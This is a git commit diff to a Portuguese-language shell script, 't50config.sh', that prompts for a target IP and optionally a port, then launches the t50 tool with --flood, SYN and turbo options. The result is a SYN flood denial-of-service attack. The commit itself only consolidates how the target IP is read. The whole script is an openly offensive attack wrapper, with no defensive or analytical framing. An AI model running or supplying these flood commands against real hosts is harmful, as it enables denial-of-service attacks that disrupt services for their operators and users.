277392c95403cfdd302083965b4382f414466fbe
H7XX <88547689+H7XX@users.noreply.github.com>
2021-08-30 13:38:00 -0300

    Update t50config.sh

--- requisitos/t50config.sh
+++ requisitos/t50config.sh
@@ -22,19 +22,19 @@ echo "                      ***  *  *  **  *  *  ***"
 echo "                       **                  **"
 echo "                         *                *"
 echo " "
+read -p "Ip do alvo: " ip
 echo "Deseja fazer o ataque em uma porta especifica?"
 read -p "S/N > " escolha01
 
 case "$escolha01" in
 	S)
-		read -p "ip: " ip01
 		read -p "porta: " port01
-		t50 $ip01 --flood -S --turbo --protocol t50 --dport $port01
+		t50 $ip --flood -S --turbo --protocol t50 --dport $port01
 	;;
 
 	N)
 		read -p "ip: " ip50
-		t50 $ip50 --flood -S --turbo --protocol t50 
+		t50 $ip --flood -S --turbo --protocol t50 
 	;;
 
 esac
